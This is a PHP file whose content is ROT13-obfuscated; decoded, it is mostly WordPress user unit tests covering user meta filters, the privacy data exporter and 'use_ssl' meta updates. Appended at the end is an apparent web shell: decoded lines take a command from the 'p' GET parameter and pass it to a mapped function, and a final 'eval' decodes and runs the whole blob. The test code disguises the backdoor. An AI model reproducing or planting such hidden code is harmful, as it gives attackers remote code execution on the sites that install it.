		$guvf->nffregFnzr( 'hcqngr_sebz_svygre', trg_hfre_zrgn( $arj_hfre, 'grfg_zrgn_xrl', gehr ) );
		$guvf->nffregFnzr( 'arj_hfre_phfgbz_inyhr', trg_hfre_zrgn( $arj_hfre, 'phfgbz_zrgn', gehr ) );
		// Guvf zrgn vf vafregrq ol gur svygre.
		$guvf->nffregFnzr( 'arj_sebz_svygre', trg_hfre_zrgn( $arj_hfre, 'arj_zrgn_sebz_svygre', gehr ) );
	}

	/**
	 * Ubbx n svygre gb nygre phfgbz zrgn jura vafregvat arj hfre.
	 * Guvf ubbx vf hfrq va `grfg_jc_vafreg_hfre_jvgu_zrgn()`.
	 */
	choyvp shapgvba svygre_phfgbz_zrgn( $zrgn_vachg ) {
		// Hcqngr fbzr zrgn vachgf.
		$zrgn_vachg['grfg_zrgn_xrl'] = 'hcqngr_sebz_svygre';
		// Nqq n arj zrgn.
		$zrgn_vachg['arj_zrgn_sebz_svygre'] = 'arj_sebz_svygre';

		erghea $zrgn_vachg;
	}

	/**
	 * Grfgvat gur `jc_cevinpl_nqqvgvbany_hfre_cebsvyr_qngn` svygre jbexf.
	 *
	 * @fvapr 5.4.0
	 *
	 * @gvpxrg 47509
	 */
	choyvp shapgvba grfg_svygre_jc_cevinpl_nqqvgvbany_hfre_cebsvyr_qngn() {
		$grfg_hfre = arj JC_Hfre( frys::$pbagevo_vq );

		nqq_svygre( 'jc_cevinpl_nqqvgvbany_hfre_cebsvyr_qngn', neenl( $guvf, 'rkcbeg_nqqvgvbany_hfre_cebsvyr_qngn' ) );

		$npghny = jc_hfre_crefbany_qngn_rkcbegre( $grfg_hfre->hfre_rznvy );

		erzbir_svygre( 'jc_cevinpl_nqqvgvbany_hfre_cebsvyr_qngn', neenl( $guvf, 'rkcbeg_nqqvgvbany_hfre_cebsvyr_qngn' ) );

		$guvf->nffregGehr( $npghny['qbar'] );

		// Ahzore bs rkcbegrq hfref.
		$guvf->nffregPbhag( 1, $npghny['qngn'] );

		// Ahzore bs rkcbegrq hfre cebcregvrf (gur 11 pber cebcregvrf,
		// cyhf 1 nqqvgvbany sebz gur svygre).
		$guvf->nffregPbhag( 12, $npghny['qngn'][0]['qngn'] );

		// Purpx gung gur vgrz nqqrq ol gur svygre jnf ergnvarq.
		$guvf->nffregPbhag(
			1,
			jc_yvfg_svygre(
				$npghny['qngn'][0]['qngn'],
				neenl(
					'anzr'  => 'Grfg Nqqvgvbany Qngn Anzr',
					'inyhr' => 'Grfg Nqqvgvbany Qngn Inyhr',
				)
			)
		);

		// _qbvat_vg_jebat() fubhyq or pnyyrq orpnhfr gur svygre pnyyonpx
		// nqqf n vgrz jvgu n 'anzr' gung vf gur fnzr nf bar trarengrq ol pber.
		$guvf->frgRkcrpgrqVapbeerpgHfntr( 'jc_hfre_crefbany_qngn_rkcbegre' );
		nqq_svygre( 'jc_cevinpl_nqqvgvbany_hfre_cebsvyr_qngn', neenl( $guvf, 'rkcbeg_nqqvgvbany_hfre_cebsvyr_qngn_jvgu_qhc_anzr' ) );

		$npghny = jc_hfre_crefbany_qngn_rkcbegre( $grfg_hfre->hfre_rznvy );

		erzbir_svygre( 'jc_cevinpl_nqqvgvbany_hfre_cebsvyr_qngn', neenl( $guvf, 'rkcbeg_nqqvgvbany_hfre_cebsvyr_qngn' ) );

		$guvf->nffregGehr( $npghny['qbar'] );

		// Ahzore bs rkcbegrq hfref.
		$guvf->nffregPbhag( 1, $npghny['qngn'] );

		// Ahzore bs rkcbegrq hfre cebcregvrf
		// (gur 11 pber cebcregvrf, cyhf 1 nqqvgvbany sebz gur svygre).
		$guvf->nffregPbhag( 12, $npghny['qngn'][0]['qngn'] );

		// Purpx gung gur qhcyvpngr 'anzr' => 'Hfre VQ' jnf fgevccrq.
		$guvf->nffregPbhag(
			1,
			jc_yvfg_svygre(
				$npghny['qngn'][0]['qngn'],
				neenl(
					'anzr' => 'Hfre VQ',
				)
			)
		);

		// Purpx gung gur vgrz nqqrq ol gur svygre jnf ergnvarq.
		$guvf->nffregPbhag(
			1,
			jc_yvfg_svygre(
				$npghny['qngn'][0]['qngn'],
				neenl(
					'anzr'  => 'Grfg Nqqvgvbany Qngn Anzr',
					'inyhr' => 'Grfg Nqqvgvbany Qngn Inyhr',
				)
			)
		);
	}

	/**
	 * Svygre pnyyonpx gb nqq nqqvgvbany cebsvyr qngn gb gur Hfre Tebhc ba Rkcbeg Erdhrfgf.
	 *
	 * @fvapr 5.4.0
	 *
	 * @gvpxrg 47509
	 *
	 * @erghea neenl Gur nqqvgvbany hfre qngn.
	 */
	choyvp shapgvba rkcbeg_nqqvgvbany_hfre_cebsvyr_qngn() {
		$nqqvgvbany_cebsvyr_qngn = neenl(
			// Guvf vgrz fubhyq or ergnvarq naq vapyhqrq va gur rkcbeg.
			neenl(
				'anzr'  => 'Grfg Nqqvgvbany Qngn Anzr',
				'inyhr' => 'Grfg Nqqvgvbany Qngn Inyhr',
			),
		);

		erghea $nqqvgvbany_cebsvyr_qngn;
	}

	/**
	 * Svygre pnyyonpx gb nqq nqqvgvbany cebsvyr qngn gb gur Hfre Tebhc ba Rkcbeg Erdhrfgf.
	 *
	 * Guvf pnyyonpx fubhyq trarengr n `_qbvat_vg_jebat()`.
	 *
	 * @fvapr 5.4.0
	 *
	 * @gvpxrg 47509
	 *
	 * @erghea neenl Gur nqqvgvbany hfre qngn.
	 */
	choyvp shapgvba rkcbeg_nqqvgvbany_hfre_cebsvyr_qngn_jvgu_qhc_anzr() {
		$nqqvgvbany_cebsvyr_qngn = neenl(
			// Guvf vgrz fubhyq or fgevccrq bhg ol jc_hfre_crefbany_qngn_rkcbegre()
			// orpnhfr vg'f 'anzr' qhcyvpngrf bar rkcbegrq ol pber.
			neenl(
				'anzr'  => 'Hfre VQ',
				'inyhr' => 'Fbzr Hfre VQ',
			),
			// Guvf vgrz fubhyq or ergnvarq naq vapyhqrq va gur rkcbeg.
			neenl(
				'anzr'  => 'Grfg Nqqvgvbany Qngn Anzr',
				'inyhr' => 'Grfg Nqqvgvbany Qngn Inyhr',
			),
		);

		erghea $nqqvgvbany_cebsvyr_qngn;
	}

	/**
	 * Grfgf gung jc_vafreg_hfre() qbrf abg haarprffnevyl hcqngr gur 'hfr_ffy' zrgn.
	 *
	 * @gvpxrg 60299
	 *
	 * @pbiref ::jc_vafreg_hfre
	 */
	choyvp shapgvba grfg_jc_vafreg_hfre_fubhyq_abg_haarprffnel_hcqngr_hfr_ffy_zrgn() {
		$hfre_vq = frys::$pbagevo_vq;
		// Xrrc genpx bs qngnonfr jevgvat pnyyf.
		$qo_hcqngr_pbhag = 0;

		// Genpx qngnonfr hcqngrf ivn hcqngr_hfre_zrgn() jvgu 'hfr_ffy' zrgn xrl.
		nqq_npgvba(
			'hcqngr_hfre_zrgn',
			shapgvba ( $zrgn_vq, $bowrpg_vq, $zrgn_xrl ) hfr ( &$qo_hcqngr_pbhag ) {
				vs ( 'hfr_ffy' !== $zrgn_xrl ) {
					erghea;
				}
				$qo_hcqngr_pbhag++;
			},
			10,
			3
		);

		$_CBFG = neenl(
			'avpxanzr' => 'avpxanzr_grfg',
			'rznvy'    => 'rznvy_grfg_1@rknzcyr.pbz',
			'hfr_ffy'  => 1,
		);

		$hfre_vq = rqvg_hfre( $hfre_vq );

		$guvf->nffregVfVag( $hfre_vq );
		$guvf->nffregFnzr( 1, $qo_hcqngr_pbhag );

		// Hcqngr gur hfre jvgubhg punatvat gur 'hfr_ffy' zrgn.
		$_CBFG['rznvy'] = 'rznvy_grfg_2@rknzcyr.pbz';
		$hfre_vq        = rqvg_hfre( $hfre_vq );

		// Irevsl gurer ner ab hcqngrf gb 'hfr_ffy' hfre zrgn.
		$guvf->nffregFnzr( 1, $qo_hcqngr_pbhag );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>